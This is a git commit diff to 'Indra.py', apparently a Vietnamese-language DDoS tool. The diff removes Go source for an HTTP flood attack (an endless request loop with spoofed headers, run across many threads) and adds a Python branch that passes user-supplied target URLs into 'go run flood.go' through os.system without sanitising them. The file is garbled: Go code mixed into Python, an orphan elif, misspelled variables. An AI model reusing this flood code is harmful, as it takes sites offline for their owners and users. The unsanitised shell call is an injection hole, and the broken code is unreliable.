7ea7ddbaf5fee6b0a5d4ac7d6a9d9dffbdefb224
NgThanhVinh <117195555+Vntvxyz@users.noreply.github.com>
2023-02-04 14:54:19 +0700

    Update Indra.py

--- Indra.py
+++ Indra.py
@@ -21,30 +21,13 @@ print(Colorate.Diagonal(Colors.red_to_yellow, Center.XCenter(panel)))
 print()
 host=input(Colorate.Diagonal(Colors.red_to_yellow, "   Nhập ./ URL Taget POST 15000: "))
 time=int(input(Colorate.Diagonal(Colors.red_to_yellow, "   Đéo biết dùng thì tao cũng chịu : ")))
-func httpflood(){
-  head := header{"false", nil}
-  sp := spoof{"127.0.0.1", 5}
-  client := &fasthttp.Client{TLSConfig: &tls.Config{CurvePreferences: []tls.CurveID{tls.CurveP256, tls.CurveP384, tls.CurveP521, tls.X25519}}}
-  req := fasthttp.AcquireRequest()
-  req.SetRequestURI(target.url)
-  req.Header.SetMethod(target.method)
-  head.headers(req)
-  sp.spoofS(req)
-  for{
-    client.Do(req, nil)
-  }
-}
-
-func main(){
-  target.url = os.Args[1]
-  target.method = os.Args[2]
-  threads, _ := strconv.Atoi(os.Args[3])
-  log.Print("Bắt Đầu...")
-  for i:=0; i < threads; i++{
-    go httpflood()
-  }
-
-  <- make(chan bool, 1)
-}
+elif "./" in cnc:
+            try:
+                url = cnc.split()[1]
+                method = cnc.split()[2]
+                os.system(f'go run flood.go -site {url} -data {method} {theads}')
+            except IndexError:
+                print(Fore.RED +'Usage: ./ <url> METHODS<GET/POST 15000>')
+                print(Fore.RED +'Example: sever http://ngthanhvinh.info/ GET')
 
 # NgThanhVinh :33
